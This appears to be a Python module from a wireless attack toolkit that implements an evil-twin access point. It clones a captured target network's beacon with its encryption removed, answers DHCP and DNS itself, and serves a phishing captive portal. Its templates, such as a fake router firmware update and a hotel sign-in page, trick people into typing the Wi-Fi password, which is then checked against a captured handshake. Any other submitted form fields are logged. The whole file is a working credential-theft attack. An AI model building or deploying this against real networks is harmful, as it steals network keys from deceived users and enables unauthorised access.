"""AP mode, built in-house: an open 802.11 AP with DHCP, DNS and a TCP/HTTP portal.

No AP stack, DHCP daemon or HTTP server library is used. The card is already in monitor mode
(wifi4's ``WlanInterface`` injects and receives raw frames), so this module builds the frames
itself: beacons/probe/auth/assoc from the target's captured beacon (RSN and privacy stripped),
802.11 data with LLC/SNAP, IPv4, UDP for DHCP and DNS, and a deliberately small TCP that is
enough for one HTTP request and one response per connection.

The portal's POST carries the Wi-Fi password a client typed. ``verify`` (the caller's vault
check against the captured handshake) decides: a match answers with the success page and stops
the AP; anything else answers with the form again and the AP stays up.
"""

from __future__ import annotations

import asyncio
import html
import os
import random
import re
import struct
import time
import traceback
from dataclasses import dataclass, field
from typing import Callable, Dict, Optional

from wifi4.dot11.ie import iter_information_elements

LLC_SNAP = b"\xaa\xaa\x03\x00\x00\x00\x08\x00"
BROADCAST_MAC = b"\xff" * 6

GATEWAY = "192.168.4.1"
NETMASK = "255.255.255.0"
DNS_SERVER = GATEWAY
LEASE_SECONDS = 3600
POOL_FIRST = 10
POOL_LAST = 200

BEACON_INTERVAL_TU = 100
BEACON_PERIOD_S = BEACON_INTERVAL_TU * 1024 / 1_000_000

_TCP_FIN = 0x01
_TCP_SYN = 0x02
_TCP_RST = 0x04
_TCP_PSH = 0x08
_TCP_ACK = 0x10

_MSS = 1400
_MAX_REQUEST = 8192
_RETRY_SECONDS = 1.0
_RETRY_COUNT = 3

#: Built-in copy, used when no template page is supplied.
TEMPLATES = {
    "default": ("Network sign-in",
                "This network needs a sign-in before the internet works. "
                "Enter the Wi-Fi password to continue."),
    "router": ("Router firmware update",
               "A required firmware update is waiting. Confirm the Wi-Fi password so the "
               "router can finish the update and restore your connection."),
    "hotel": ("Hotel Wi-Fi",
              "Welcome. Enter the room's Wi-Fi password to activate internet access for "
              "this stay."),
}


# --------------------------------------------------------------------------- bytes


def _ip(text: str) -> bytes:
    return bytes(int(part) for part in text.split("."))


def _ip_text(raw: bytes) -> str:
    return ".".join(str(part) for part in raw)


def _mac(raw) -> bytes:
    if isinstance(raw, (bytes, bytearray)):
        return bytes(raw[:6])
    text = str(raw or "").replace("-", ":").split(":")
    try:
        return bytes(int(part, 16) for part in text[:6])
    except ValueError:
        return b"\x00" * 6


def _checksum(data: bytes) -> int:
    if len(data) % 2:
        data += b"\x00"
    total = 0
    for index in range(0, len(data), 2):
        total += (data[index] << 8) | data[index + 1]
    while total >> 16:
        total = (total & 0xFFFF) + (total >> 16)
    return (~total) & 0xFFFF


def _tcp_checksum(src: bytes, dst: bytes, segment: bytes) -> int:
    pseudo = src + dst + b"\x00\x06" + struct.pack("!H", len(segment))
    return _checksum(pseudo + segment)


def ipv4(src: str, dst: str, protocol: int, payload: bytes, ident: int = 0) -> bytes:
    header = struct.pack("!BBHHHBBH4s4s", 0x45, 0, 20 + len(payload), ident & 0xFFFF,
                         0x4000, 64, protocol, 0, _ip(src), _ip(dst))
    header = header[:10] + struct.pack("!H", _checksum(header)) + header[12:]
    return header + payload


def udp(sport: int, dport: int, payload: bytes) -> bytes:
    # A zero UDP checksum is legal over IPv4 and saves the pseudo-header work.
    return struct.pack("!HHHH", sport, dport, 8 + len(payload), 0) + payload


def tcp(src_ip: str, dst_ip: str, sport: int, dport: int, seq: int, ack: int,
        flags: int, payload: bytes = b"", window: int = 64240) -> bytes:
    header = struct.pack("!HHIIBBHHH", sport, dport, seq & 0xFFFFFFFF, ack & 0xFFFFFFFF,
                         (5 << 4), flags, window, 0, 0)
    checksum = _tcp_checksum(_ip(src_ip), _ip(dst_ip), header + payload)
    header = header[:16] + struct.pack("!H", checksum) + header[18:]
    return header + payload


# ------------------------------------------------------------------- 802.11 frames


def _mgmt_frame(fc0: int, bssid: bytes, dest: bytes, body: bytes,
                seq: int = 0) -> bytes:
    return (bytes([fc0, 0x00]) + b"\x00\x00" + dest + bssid + bssid
            + struct.pack("<H", (seq & 0xFFF) << 4) + body)


def _tags_without(beacon: bytes, drop_ssid: bool = False) -> bytes:
    """The beacon's information elements, less TIM and (optionally) the old SSID."""
    kept = bytearray()
    for tag, _body, elem in iter_information_elements(beacon[36:]):
        if tag == 5:                       # TIM is beacon-only
            continue
        if drop_ssid and tag in (0, 3):
            continue
        kept += elem
    return bytes(kept)


def _minimal_beacon(bssid: bytes, ssid: str, channel: int) -> bytes:
    """A plain 2.4 GHz open beacon for when the target was not captured this session."""
    name = ssid.encode("utf-8")[:32]
    head = (b"\x80\x00" + b"\x00\x00" + BROADCAST_MAC + bssid + bssid + b"\x00\x00"
            + b"\x00" * 8 + struct.pack("<HH", BEACON_INTERVAL_TU, 0x0001))
    rates = bytes([0x82, 0x84, 0x8b, 0x96, 0x0c, 0x12, 0x18, 0x24])
    tags = (bytes([0, len(name)]) + name + bytes([1, len(rates)]) + rates
            + bytes([3, 1, channel & 0xFF]) + bytes([5, 4, 0, 1, 0, 0]))
    return head + tags


def open_beacon(real_beacon: bytes, bssid: bytes, ssid: str, channel: int,
                seq: int = 0) -> bytes:
    """The target's beacon as an OPEN AP: privacy and every RSN/WPA element removed.

    Keeping the target's rates/HT/VHT/EHT elements is what lets a 5 GHz client associate;
    the SSID and the DS channel are rewritten to the AP mode's own. Without a captured
    beacon (the AP was not seen this session) a plain 2.4 GHz open beacon is built instead.
    """
    if len(real_beacon) < 36:
        return _minimal_beacon(bssid, ssid, channel)
    head = bytearray(real_beacon[:36])
    head[0] = 0x80                          # beacon
    head[1] = 0x00
    head[10:16] = bssid                     # Addr2
    head[16:22] = bssid                     # Addr3
    capability = struct.unpack_from("<H", head, 34)[0] & ~0x0010
    struct.pack_into("<H", head, 34, capability)
    head[24:32] = b"\x00" * 8               # timestamp is restamped per send
    name = ssid.encode("utf-8")[:32]
    tags = bytearray()
    for tag, body, elem in iter_information_elements(real_beacon[36:]):
        if tag in (0x30, 0xF4):             # RSN, RSNXE
            continue
        if tag == 0xDD and body[:4] == b"\x00\x50\xf2\x01":   # WPA vendor IE
            continue
        if tag == 5:                        # TIM
            continue
        if tag == 0:
            tags += bytes([0, len(name)]) + name
        elif tag == 3:
            tags += bytes([3, 1, channel & 0xFF])
        else:
            tags += elem
    if not any(tag == 0 for tag, _body, _elem in iter_information_elements(bytes(tags))):
        tags = bytes([0, len(name)]) + name + bytes(tags)
    return bytes(head) + bytes(tags)


def probe_response(beacon: bytes, client: bytes, seq: int = 0) -> bytes:
    head = bytearray(beacon[:36])
    head[0] = 0x50
    head[4:10] = client
    head[24:32] = b"\x00" * 8
    return bytes(head) + _tags_without(beacon)


def auth_response(bssid: bytes, client: bytes, seq: int = 0) -> bytes:
    return _mgmt_frame(0xB0, bssid, client, struct.pack("<HHH", 0, 2, 0), seq)


def assoc_response(beacon: bytes, bssid: bytes, client: bytes,
                   reassoc: bool = False, seq: int = 0) -> bytes:
    capability = struct.unpack_from("<H", beacon, 34)[0]
    body = struct.pack("<HHH", capability, 0, 1 | 0xC000) + _tags_without(
        beacon, drop_ssid=True)
    return _mgmt_frame(0x30 if reassoc else 0x10, bssid, client, body, seq)


def data_frame(bssid: bytes, client: bytes, payload: bytes,
               dest: bytes = None) -> bytes:
    """From-DS data frame carrying ``payload`` (LLC/SNAP included by the caller)."""
    return (b"\x08\x02" + b"\x00\x00" + client + bssid + (dest or bssid)
            + b"\x00\x00" + payload)


def ack_frame(client: bytes) -> bytes:
    return b"\xd4\x00\x00\x00" + client


# ----------------------------------------------------------------------- DHCP/DNS


def dhcp_reply(request: bytes, yiaddr: str, server: str = GATEWAY) -> Optional[bytes]:
    """An OFFER (2) or ACK (5) for a BOOTP request; None when it is not a request."""
    if len(request) < 240 or request[0] != 1:
        return None
    options = _dhcp_options(request[240:])
    kind = options.get(53, b"")
    if kind not in (b"\x01", b"\x03"):      # DISCOVER, REQUEST
        return None
    reply_kind = 2 if kind == b"\x01" else 5
    xid = request[4:8]
    flags = request[10:12]
    chaddr = request[28:44]
    header = struct.pack("!BBBBIHH4s4s4s4s16s64s128s",
                         2, 1, 6, 0, struct.unpack("!I", xid)[0],
                         0, 0x8000, b"\x00" * 4, _ip(yiaddr), b"\x00" * 4,
                         b"\x00" * 4, chaddr, b"\x00" * 64, b"\x00" * 128)
    body = b"\x63\x82\x53\x63"
    body += bytes([53, 1, reply_kind])
    body += bytes([54, 4]) + _ip(server)
    body += bytes([51, 4]) + struct.pack("!I", LEASE_SECONDS)
    body += bytes([1, 4]) + _ip(NETMASK)
    body += bytes([3, 4]) + _ip(server)
    body += bytes([6, 4]) + _ip(DNS_SERVER)
    body += bytes([255])
    return header + body


def _dhcp_options(raw: bytes) -> Dict[int, bytes]:
    options: Dict[int, bytes] = {}
    index = 0
    while index < len(raw):
        code = raw[index]
        if code == 0:
            index += 1
            continue
        if code == 255 or index + 1 >= len(raw):
            break
        length = raw[index + 1]
        options[code] = raw[index + 2:index + 2 + length]
        index += 2 + length
    return options


def dns_reply(query: bytes, answer: str = GATEWAY) -> Optional[bytes]:
    """Answer every A query with ``answer`` so the client's captive-portal probe lands here."""
    if len(query) < 12:
        return None
    flags = struct.unpack_from("!H", query, 2)[0]
    if flags & 0x8000 or struct.unpack_from("!H", query, 4)[0] < 1:
        return None
    index = 12
    while index < len(query) and query[index] != 0:
        length = query[index]
        if length & 0xC0:
            index += 2
            break
        index += 1 + length
    else:
        if index >= len(query):
            return None
        index += 1
    if index + 4 > len(query):
        return None
    question = query[12:index + 4]
    header = struct.pack("!HHHHHH", struct.unpack_from("!H", query, 0)[0], 0x8180, 1, 1, 0, 0)
    answer_record = (b"\xc0\x0c" + struct.pack("!HHI", 1, 1, 0)
                     + struct.pack("!H", 4) + _ip(answer))
    return header + question + answer_record


# --------------------------------------------------------------------------- HTTP


def _page(title: str, body: str, ssid: str, error: str = "") -> str:
    notice = f"<p class=\"err\">{html.escape(error)}</p>" if error else ""
    return ("<!doctype html><html lang=\"en\"><head><meta charset=\"utf-8\">"
            "<meta name=\"viewport\" content=\"width=device-width,initial-scale=1\">"
            f"<title>{html.escape(title)}</title><style>"
            "body{font-family:system-ui,sans-serif;margin:0;background:#eef1f6;color:#15181d}"
            "main{max-width:22rem;margin:12vh auto;background:#fff;border-radius:14px;"
            "padding:1.6rem;box-shadow:0 10px 30px #0001}"
            "h1{font-size:1.15rem;margin:0 0 .4rem}p{color:#4b5563;font-size:.92rem}"
            ".err{color:#b91c1c}label{display:block;font-size:.78rem;margin:.8rem 0 .25rem;"
            "color:#374151}input{width:100%;padding:.6rem;border:1px solid #d1d5db;"
            "border-radius:8px;font-size:1rem}button{margin-top:1rem;width:100%;padding:.7rem;"
            "border:0;border-radius:8px;background:#111827;color:#fff;font-size:1rem}"
            ".ok{color:#047857}</style></head><body><main>"
            f"<h1>{html.escape(title)}</h1><p>{html.escape(body)}</p>"
            f"<p><strong>{html.escape(ssid)}</strong></p>{notice}"
            "<form method=\"post\" action=\"/\">"
            "<label for=\"password\">Network password</label>"
            "<input id=\"password\" name=\"password\" type=\"password\" "
            "autocomplete=\"off\" required>"
            "<button type=\"submit\">Connect</button></form></main></body></html>")


def http_response(body: str, status: str = "200 OK") -> bytes:
    raw = body.encode("utf-8")
    head = (f"HTTP/1.1 {status}\r\nContent-Type: text/html; charset=utf-8\r\n"
            f"Content-Length: {len(raw)}\r\nConnection: close\r\n"
            "Cache-Control: no-store\r\n\r\n")
    return head.encode("utf-8") + raw


def _read_html(path: Optional[str]) -> str:
    if not path:
        return ""
    try:
        with open(path, "r", encoding="utf-8", errors="replace") as handle:
            return handle.read(2_000_000)
    except OSError:
        return ""


def _form_attributes(markup: str) -> str:
    """Point the page's form at us, with POST, so every field reaches the portal."""
    return re.sub(r"<form\b[^>]*>", '<form method="post" action="/">', markup, count=1,
                  flags=re.IGNORECASE)


def _password_input(ssid: str) -> str:
    return ("<div style=\"margin-top:14px\">"
            "<label for=\"wifi-password\" style=\"display:block;font-size:.8rem;"
            "margin-bottom:6px\">Wi-Fi password</label>"
            "<input id=\"wifi-password\" name=\"password\" type=\"password\" "
            "autocomplete=\"off\" required style=\"width:100%;padding:.6rem;"
            "border:1px solid #d1d5db;border-radius:8px;font-size:1rem\">"
            f"<button type=\"submit\" style=\"margin-top:12px;width:100%;padding:.7rem;"
            "border:0;border-radius:8px;background:#111827;color:#fff;font-size:1rem\">"
            f"Connect to {html.escape(ssid)}</button></div>")


def prepare_portal_html(markup: str, ssid: str) -> str:
    """A catalog page made submittable: POST to us, and a password field when it has none.

    Most pages already carry a password input; the few that only ask for a username get one
    appended, because the portal exists to check the network's key, not a username.
    """
    if not markup:
        return ""
    page = _form_attributes(markup)
    if re.search(r"type\s*=\s*[\"']?password", page, re.IGNORECASE):
        return page
    field = _password_input(ssid)
    lower = page.lower()
    closing = lower.rfind("</form>")
    if closing >= 0:
        return page[:closing] + field + page[closing:]
    return page + '<form method="post" action="/">' + field + "</form>"


def portal_error_page(markup: str, message: str) -> str:
    """The same page with a short banner, so a mismatch looks like a retry."""
    banner = ("<div style=\"margin:0 0 14px;padding:10px 12px;border-radius:8px;"
              "background:#fee2e2;color:#991b1b;font:14px system-ui,sans-serif\">"
              + html.escape(message) + "</div>")
    lower = markup.lower()
    body = lower.find("<body")
    if body >= 0:
        close = markup.find(">", body)
        if close >= 0:
            return markup[:close + 1] + banner + markup[close + 1:]
    return banner + markup


def http_fields(request: bytes) -> Dict[str, str]:
    """Every form field of a POST (or a GET query), first value per name."""
    head, _, body = request.partition(b"\r\n\r\n")
    first = head.split(b"\r\n", 1)[0].decode("latin-1", "replace")
    parts = first.split(" ")
    if len(parts) < 2:
        return {}
    method, target = parts[0].upper(), parts[1]
    if method == "POST":
        for line in head.split(b"\r\n")[1:]:
            if line.lower().startswith(b"content-length:"):
                try:
                    body = body[:int(line.split(b":", 1)[1].strip())]
                except ValueError:
                    pass
                break
        raw = body
    elif method == "GET":
        raw = target.partition("?")[2].encode("utf-8")
    else:
        return {}
    from urllib.parse import parse_qs

    try:
        values = parse_qs(raw.decode("utf-8", "replace"), keep_blank_values=True)
    except Exception:
        return {}
    return {key: entries[0] for key, entries in values.items() if entries}


#: Field names catalog pages use for the key; checked in this order.
_PASSWORD_NAMES = ("password", "pass", "passwd", "pwd", "wifi_password", "wpa", "psk",
                   "passphrase", "wifi-password")


def password_from(fields: Dict[str, str]) -> Optional[str]:
    for name in _PASSWORD_NAMES:
        value = fields.get(name)
        if value:
            return value
    return None


def http_password(request: bytes) -> Optional[str]:
    """The submitted Wi-Fi password, or None when the request carries no form fields."""
    return password_from(http_fields(request))


# --------------------------------------------------------------------------- AP


@dataclass
class _Conn:
    client: bytes
    peer_ip: str
    sport: int
    seq: int
    their_seq: int
    state: str = "synack"
    request: bytearray = field(default_factory=bytearray)
    pending: Optional[bytes] = None
    pending_end: int = 0
    deadline: float = 0.0
    tries: int = 0


class PortalAp:
    """An open AP on wifi4's card, serving the captive portal and its DHCP/DNS.

    ``verify(password) -> bool`` is the caller's vault check. The AP stops itself once a match
    is answered, and keeps serving the form for every mismatch.
    """

    key = "portal"
    fail_reason = ""

    def __init__(self, array, target, iface, ssid: str, template: str,
                 verify: Callable[[str], bool], log: Callable[[str], None] = None,
                 template_path: str = None, success_path: str = None):
        self.array = array
        self.target = target
        self.iface = iface
        self.ssid = (ssid or getattr(target, "ssid", "") or "WiFi").strip()
        self.template = template if template in TEMPLATES else "default"
        # A catalog page (or one the user supplied) replaces the built-in copy entirely.
        self.portal_html = prepare_portal_html(_read_html(template_path), self.ssid)
        self.success_html = _read_html(success_path)
        self.verify = verify
        self.log = log or (lambda _line: None)
        self.channel = int(getattr(target, "channel", 1) or 1)
        self.bssid = _mac(getattr(iface, "mac_address", None))
        if self.bssid == b"\x00" * 6:
            self.bssid = _mac(os.urandom(6))
            self.bssid = bytes([self.bssid[0] & 0xFC | 0x02]) + self.bssid[1:]
        self.beacon = open_beacon(getattr(target, "last_beacon_frame", b"") or b"",
                                  self.bssid, self.ssid, self.channel)
        self.seq = random.randint(0, 0xFFF)
        self.stopped = False
        self.done = False
        self.matched = False
        self.clients: Dict[bytes, str] = {}
        self.conns: Dict[tuple, _Conn] = {}
        self._next_ip = POOL_FIRST
        self._tasks = set()
        self._beacon_task = None
        self._rx_registered = False
        self._fake_mac = False
        self._loop = None

    # ----- lifecycle ---------------------------------------------------------

    async def run(self) -> None:
        """Start serving and return, the way wifi4's campaigns start their own task."""
        self.log(f"AP starting: '{self.ssid}' on CH {self.channel}")
        asyncio.create_task(self._serve())

    async def _serve(self) -> None:
        self._loop = asyncio.get_running_loop()
        try:
            if getattr(self.iface, "current_channel", self.channel) != self.channel:
                try:
                    await self.iface.set_channel(self.channel)
                except Exception as exc:
                    # The card may refuse a channel while another adapter setting holds it;
                    # beacons can still go out on whatever channel it is already on.
                    self.log(f"AP: could not switch to CH {self.channel} ({exc}); trying anyway")
            try:
                armed = await self.iface.set_fake_mac(self.bssid, self.bssid)
                self._fake_mac = bool(armed)
            except Exception as exc:
                # Some adapters cannot take a fixed MAC; the card's own address still works.
                self.log(f"AP: no twin MAC ({exc}); using the card's own address")
            self.iface.register_rx_callback(self._on_frame)
            self._rx_registered = True
            self.log(f"AP '{self.ssid}' up on CH {self.channel} ({self.bssid.hex(':', 1)})")
            self._beacon_task = asyncio.create_task(self._beacon_loop())
            while not self.stopped:
                await asyncio.sleep(0.2)
                self._retransmit()
        except Exception as exc:
            # Never fail silently: the UI shows these lines, so a dead AP has a reason.
            self.fail_reason = str(exc)
            self.log(f"AP failed: {exc}")
            traceback.print_exc()
        finally:
            self.done = True
            await self._cleanup()

    def request_stop(self) -> None:
        self.stopped = True

    async def stop(self) -> None:
        self.stopped = True
        await self._cleanup()
        self.done = True

    async def _cleanup(self) -> None:
        if self._beacon_task is not None:
            self._beacon_task.cancel()
            try:
                await self._beacon_task
            except (asyncio.CancelledError, Exception):
                pass
            self._beacon_task = None
        for task in list(self._tasks):
            task.cancel()
        self._tasks.clear()
        if self._rx_registered:
            self._rx_registered = False
            try:
                self.iface.unregister_rx_callback(self._on_frame)
            except Exception:
                pass
        if self._fake_mac:
            self._fake_mac = False
            try:
                await self.iface.clear_fake_mac()
            except Exception:
                pass

    def status_under_dash(self, array, now: float):
        lines = [f"[cyan]AP[/cyan] '{self.ssid}' on CH {self.channel}"]
        if self.clients:
            lines.append("[dim]" + ", ".join(
                f"{_mac_text(mac)}={ip}" for mac, ip in list(self.clients.items())[:4]) + "[/dim]")
        else:
            lines.append("[dim]waiting for a client…[/dim]")
        return lines

    # ----- sending -----------------------------------------------------------

    def _schedule(self, coroutine) -> None:
        task = asyncio.ensure_future(coroutine)
        self._tasks.add(task)
        task.add_done_callback(self._tasks.discard)

    def _send(self, frame: bytes) -> None:
        self._schedule(self.iface.send_no_wait(frame))

    def _send_ip(self, client: bytes, packet: bytes, dest: bytes = None) -> None:
        self._send(data_frame(self.bssid, client, LLC_SNAP + packet, dest))

    def _next_seq(self) -> int:
        self.seq = (self.seq + 1) & 0xFFF
        return self.seq

    async def _beacon_loop(self) -> None:
        while not self.stopped:
            try:
                frame = bytearray(self.beacon)
                frame[24:32] = struct.pack("<Q", int(time.time() * 1_000_000))
                self._send(bytes(frame))
            except Exception as exc:
                self.log(f"AP beacon failed: {exc}")
            await asyncio.sleep(BEACON_PERIOD_S)

    # ----- receive -----------------------------------------------------------

    def _on_frame(self, packet) -> None:
        raw = bytes(getattr(packet, "raw", b"") or b"")
        if len(raw) < 24 or self.stopped:
            return
        fc0, fc1 = raw[0], raw[1]
        kind = (fc0 >> 2) & 0x03
        subtype = (fc0 >> 4) & 0x0F
        if kind == 0:
            if raw[4:10] not in (self.bssid, BROADCAST_MAC):
                return
            if subtype == 0x04:
                self._send(probe_response(self.beacon, raw[10:16], self._next_seq()))
            elif subtype == 0x0B:
                client = raw[10:16]
                self._send(ack_frame(client))
                self._send(auth_response(self.bssid, client, self._next_seq()))
            elif subtype in (0x00, 0x02):
                client = raw[10:16]
                self._send(ack_frame(client))
                self._send(assoc_response(self.beacon, self.bssid, client,
                                          reassoc=subtype == 0x02, seq=self._next_seq()))
            return
        if kind != 2 or fc1 & 0x02:              # only To-DS frames from a client
            return
        if raw[4:10] != self.bssid:
            return
        client = raw[10:16]
        length = 24 + (2 if (subtype & 0x08) else 0) + (4 if (fc1 & 0x80) else 0)
        if len(raw) < length + 8:
            return
        self._send(ack_frame(client))            # the card does not ACK for us in monitor mode
        if raw[length:length + 6] != b"\xaa\xaa\x03\x00\x00\x00":
            return
        ethertype = raw[length + 6:length + 8]
        payload = raw[length + 8:]
        if ethertype == b"\x08\x06":
            self._on_arp(client, payload)
        elif ethertype == b"\x08\x00":
            self._on_ipv4(client, payload)

    def _on_arp(self, client: bytes, packet: bytes) -> None:
        if len(packet) < 28:
            return
        oper = struct.unpack_from("!H", packet, 6)[0]
        target_ip = packet[24:28]
        if oper != 1 or target_ip != _ip(GATEWAY):
            return
        sender_mac = packet[8:14]
        self._send(data_frame(self.bssid, client,
                              _arp_reply(self.bssid, _ip(GATEWAY), sender_mac,
                                         packet[14:18])))

    def _on_ipv4(self, client: bytes, packet: bytes) -> None:
        if len(packet) < 20 or (packet[0] >> 4) != 4:
            return
        header_length = (packet[0] & 0x0F) * 4
        total = struct.unpack_from("!H", packet, 2)[0]
        packet = packet[:min(total, len(packet))]
        protocol = packet[9]
        src = _ip_text(packet[12:16])
        dst = _ip_text(packet[16:20])
        body = packet[header_length:]
        if protocol == 17 and len(body) >= 8:
            sport, dport = struct.unpack_from("!HH", body, 0)
            data = body[8:]
            if dport == 67:
                self._on_dhcp(client, data)
            elif dport == 53:
                self._on_dns(client, data)
        elif protocol == 6 and len(body) >= 20:
            self._on_tcp(client, src, dst, body)

    # ----- DHCP / DNS --------------------------------------------------------

    def _lease(self, client: bytes) -> str:
        if client not in self.clients:
            self.clients[client] = f"192.168.4.{self._next_ip}"
            self._next_ip += 1
            if self._next_ip > POOL_LAST:
                self._next_ip = POOL_FIRST
            self.log(f"leased {self.clients[client]} to {_mac_text(client)}")
        return self.clients[client]

    def _on_dhcp(self, client: bytes, data: bytes) -> None:
        lease = self._lease(client)
        reply = dhcp_reply(data, lease)
        if reply is None:
            return
        broadcast = len(data) < 12 or bool(struct.unpack_from("!H", data, 10)[0] & 0x8000)
        if broadcast:
            packet = ipv4(GATEWAY, "255.255.255.255", 17, udp(67, 68, reply))
            self._send_ip(client, packet, dest=BROADCAST_MAC)
        else:
            self._send_ip(client, ipv4(GATEWAY, lease, 17, udp(67, 68, reply)))

    def _on_dns(self, client: bytes, data: bytes) -> None:
        reply = dns_reply(data)
        if reply is None or len(data) < 8:
            return
        sport = struct.unpack_from("!H", data, 0)[0]
        packet = ipv4(GATEWAY, self._client_ip(client), 17, udp(53, sport, reply))
        self._send_ip(client, packet)

    def _client_ip(self, client: bytes) -> str:
        return self.clients.get(client, "192.168.4.2")

    # ----- TCP ---------------------------------------------------------------

    def _on_tcp(self, client: bytes, src: str, dst: str, segment: bytes) -> None:
        sport, dport, seq, ack = struct.unpack_from("!HHII", segment, 0)
        flags = segment[13]
        offset = (segment[12] >> 4) * 4
        payload = segment[offset:]
        key = (client, sport)
        conn = self.conns.get(key)
        if conn is None:
            if not flags & _TCP_SYN:
                return
            conn = _Conn(client=client, peer_ip=src, sport=sport,
                         seq=random.randint(0, 0xFFFFFFFF),
                         their_seq=(seq + 1) & 0xFFFFFFFF)
            self.conns[key] = conn
            synack = tcp(GATEWAY, src, 80, sport, conn.seq, conn.their_seq,
                         _TCP_SYN | _TCP_ACK)
            conn.seq = (conn.seq + 1) & 0xFFFFFFFF
            conn.pending = synack
            conn.pending_end = conn.seq
            conn.deadline = time.time() + _RETRY_SECONDS
            self._send_ip(client, ipv4(GATEWAY, src, 6, synack))
            return
        if flags & _TCP_RST:
            self.conns.pop(key, None)
            return
        if flags & _TCP_SYN:
            return
        if flags & _TCP_ACK and conn.pending and ack == conn.pending_end:
            conn.pending = None
            if conn.state == "synack":
                conn.state = "open"
        if payload:
            if seq != conn.their_seq:
                # Out of order: re-ACK what we have so the client retransmits in order.
                self._tcp_ack(conn, src)
                return
            conn.their_seq = (conn.their_seq + len(payload)) & 0xFFFFFFFF
            if len(conn.request) < _MAX_REQUEST:
                conn.request += payload
            if b"\r\n\r\n" in conn.request and self._request_complete(conn.request):
                self._answer_http(conn, src)
            else:
                self._tcp_ack(conn, src)
            return
        if flags & _TCP_FIN:
            self._tcp_ack(conn, src)
            self.conns.pop(key, None)
            return
        if flags & _TCP_ACK and conn.pending is None and conn.state == "closed":
            self.conns.pop(key, None)

    def _tcp_ack(self, conn: _Conn, src: str) -> None:
        segment = tcp(GATEWAY, src, 80, conn.sport, conn.seq, conn.their_seq, _TCP_ACK)
        self._send_ip(conn.client, ipv4(GATEWAY, src, 6, segment))

    @staticmethod
    def _request_complete(request: bytes) -> bool:
        head, _, body = request.partition(b"\r\n\r\n")
        length = 0
        for line in head.split(b"\r\n")[1:]:
            if line.lower().startswith(b"content-length:"):
                try:
                    length = int(line.split(b":", 1)[1].strip())
                except ValueError:
                    length = 0
        return len(body) >= length

    def _form_page(self, error: str = "") -> str:
        if self.portal_html:
            return portal_error_page(self.portal_html, error) if error else self.portal_html
        title, body = TEMPLATES[self.template]
        return _page(title, body, self.ssid, error=error)

    def _success_page(self) -> str:
        if self.success_html:
            return self.success_html
        return _page("Connected", "The Wi-Fi password was accepted.", self.ssid)

    def _answer_http(self, conn: _Conn, src: str) -> None:
        fields = http_fields(bytes(conn.request))
        password = password_from(fields)
        if fields:
            # The catalog pages carry usernames and other fields; log what was sent for the UI.
            shown = ", ".join(f"{name}={value}" for name, value in fields.items())
            self.log(f"portal form from {_mac_text(conn.client)}: {shown[:200]}")
        if password is None:
            conn.request.clear()
            self._respond(conn, src, http_response(self._form_page()))
            return
        ok = False
        try:
            ok = bool(self.verify(password))
        except Exception:
            ok = False
        if ok:
            self.matched = True
            self.log("portal password matched the handshake; closing the AP")
            self._respond(conn, src, http_response(self._success_page()))
            self._schedule(self._finish_soon())
        else:
            self.log("portal password did not match; keeping the AP up")
            self._respond(conn, src, http_response(
                self._form_page("Incorrect password. Try again.")))

    async def _finish_soon(self) -> None:
        await asyncio.sleep(0.8)
        self.request_stop()

    def _respond(self, conn: _Conn, src: str, response: bytes) -> None:
        segment = tcp(GATEWAY, src, 80, conn.sport, conn.seq, conn.their_seq,
                      _TCP_ACK | _TCP_PSH | _TCP_FIN, response)
        conn.seq = (conn.seq + len(response) + 1) & 0xFFFFFFFF
        conn.pending = segment
        conn.pending_end = conn.seq
        conn.deadline = time.time() + _RETRY_SECONDS
        conn.tries = 0
        conn.state = "closed"
        conn.request.clear()
        self._send_ip(conn.client, ipv4(GATEWAY, src, 6, segment))

    def _retransmit(self) -> None:
        now = time.time()
        for key, conn in list(self.conns.items()):
            if conn.pending is None or now < conn.deadline:
                continue
            if conn.tries >= _RETRY_COUNT:
                self.conns.pop(key, None)
                continue
            conn.tries += 1
            conn.deadline = now + _RETRY_SECONDS
            self._send_ip(conn.client, ipv4(GATEWAY, conn.peer_ip, 6, conn.pending))


def _mac_text(raw: bytes) -> str:
    return ":".join(f"{part:02x}" for part in raw)


def _arp_reply(bssid: bytes, ip: bytes, sender_mac: bytes, sender_ip: bytes) -> bytes:
    """LLC/SNAP + ARP reply from ``bssid``/``ip`` to one station."""
    body = (struct.pack("!HHBBH", 1, 0x0800, 6, 4, 2)
            + bssid + ip + sender_mac + sender_ip)
    return LLC_SNAP + body
